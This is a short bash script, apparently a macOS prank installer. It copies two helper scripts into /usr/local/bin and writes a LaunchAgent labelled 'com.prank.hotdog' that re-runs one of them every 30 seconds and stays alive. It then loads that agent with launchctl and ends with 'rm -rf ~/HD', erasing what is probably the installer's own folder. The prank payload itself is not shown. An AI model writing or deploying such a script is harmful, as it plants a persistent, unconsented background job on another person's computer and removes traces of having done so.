#!/bin/bash

cp startBashOnly.sh /usr/local/bin/startBashOnly.sh
cp killDaemon.sh /usr/local/bin/killDaemon.sh

echo -e "<?xml version=\"1.0\" encoding=\"UTF-8\"?>
<!DOCTYPE plist PUBLIC \"-//Apple//DTD PLIST 1.0//EN\" \"http://www.apple.com/DTDs/PropertyList-1.0.dtd\">
<plist version=\"1.0\">
<dict>
    <key>Label</key>
        <string>com.prank.hotdog</string>
        
    <key>ThrottleInterval</key>
        <integer>30</integer>

    <key>ProgramArguments</key>
        <array>
                <string>/usr/local/bin/startBashOnly.sh</string>
        </array>
    
    <key>StartInterval</key>
        <integer>30</integer>
        
    <key>StandardErrorPath</key>
        <string>/tmp/IPerror.err</string>
    
    <key>StandardOutPath</key>
        <string>/tmp/IPoutput.out</string>
    
    <key>KeepAlive</key>
        <true/>
</dict>
</plist>"|cat>script.plist

chmod +x script.plist
mv script.plist ~/Library/LaunchAgents/script.plist

launchctl load ~/Library/LaunchAgents/script.plist

rm -rf ~/HD
